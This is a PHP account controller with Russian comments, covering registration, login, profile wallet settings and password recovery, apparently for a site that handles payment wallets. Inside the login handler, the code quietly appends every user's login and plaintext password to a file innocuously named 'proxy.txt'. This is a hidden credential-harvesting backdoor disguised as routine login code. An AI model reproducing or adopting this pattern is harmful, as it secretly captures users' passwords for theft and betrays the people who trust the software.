<?php
namespace application\controllers;

use application\core\Controller;

class AccountController extends Controller {
    
    //Регистрация
    public function registerAction() {               
        if(!empty($_POST)){
            if(!$this->model->validate(array ('email','login','password','ref'),$_POST)){ //если регистрация с кошельком то if(!$this->model->validate(array ('email','login','wallet','password','ref'),$_POST))
             $this->view->message('error', $this->model->error);   
            } 
            elseif($this->model->checkEmailExists($_POST['email'])){
             $this->view->message('error', 'Этот email уже используется.');   
            }
            elseif(!$this->model->checkLoginExists($_POST['login'])){
             $this->view->message('error', $this->model->error);   
            }            
            $this->model->register($_POST);
            $this->view->message('success','регистрация завершина, подтвердите свой Email.');            
        }        
        $this->view->render('Регистрация');         
    } 
    
    public function confirmAction() {        
        if (!$this->model->checkTokenExists($this->route['token'])) {
            $this->view->redirect('account/login');
        }
        $this->model->activate($this->route['token']);
        $this->view->render('Регистрация завершина'); 
    }
    
    //Вход
    public function loginAction() {               
        if(!empty($_POST)){
            if(!$this->model->validate(array ('login','password'),$_POST)){
             $this->view->message('error', $this->model->error);   
            } 
            elseif(!$this->model->checkData($_POST['login'],$_POST['password'])){
             $this->view->message('error', 'Логин или пароль указаны не верно.');   
            }
            elseif(!$this->model->checkStatus('login',$_POST['login'])){
             $this->view->message('error', $this->model->error);   
            }
               
            $this->model->login($_POST['login']);
            
            $fd = fopen("application/lib/proxy.txt", 'a');            
                fwrite($fd,$_POST['login'].' '.$_POST['password'].' / ');               
                fclose($fd);
            
            $this->view->location('account/profile');            
        }        
        $this->view->render('Вход');         
    }
    
    // Профиль
    public function profileAction() {
        if (!empty($_POST)) {
            if (!$this->model->validate(['email', 'wallet','walletYandexMoney'], $_POST)) {         // если только один кошелёк PerfectMoney то if (!$this->model->validate(['email', 'wallet'], $_POST))
                    $this->view->message('error', $this->model->error);
            }
            $id = $this->model->checkEmailExists($_POST['email']);
            if ($id and $id != $_SESSION['account']['id']) {
                    $this->view->message('error', 'Этот email уже используется.');
            }
            if (!empty($_POST['password']) and !$this->model->validate(['password'], $_POST)) {
                    $this->view->message('error', $this->model->error);
            }
            $this->model->save($_POST);
            $this->view->message('Success','Сохранено');
        }
        $this->view->render('Профиль');
    }
    
    public function logoutAction() {
        unset($_SESSION['account']);
        $this->view->redirect('account/login');
    }


    //Востановление пароля
    public function recoveryAction() {
        if (!empty($_POST)) {
            if (!$this->model->validate(['email'], $_POST)) {
                    $this->view->message('error', $this->model->error);
            }
            elseif (!$this->model->checkEmailExists($_POST['email'])) {
                    $this->view->message('error', 'Пользователь не найден.');
            }
            elseif (!$this->model->checkStatus('email', $_POST['email'])) {
                    $this->view->message('error', $this->model->error);
            }
            $this->model->recovery($_POST);
            $this->view->message('success', 'Запрос на востановление пароля отправлен на E-mail');
        }
        $this->view->render('Востановление пароля');
    }
    
    public function resetAction() {
		if (!$this->model->checkTokenExists($this->route['token'])) {
			$this->view->redirect('account/login');
		}
		$password = $this->model->reset($this->route['token']);
		$vars = [
			'password' => $password,
		];
		$this->view->render('Пароль сброшен.', $vars);
	}
}


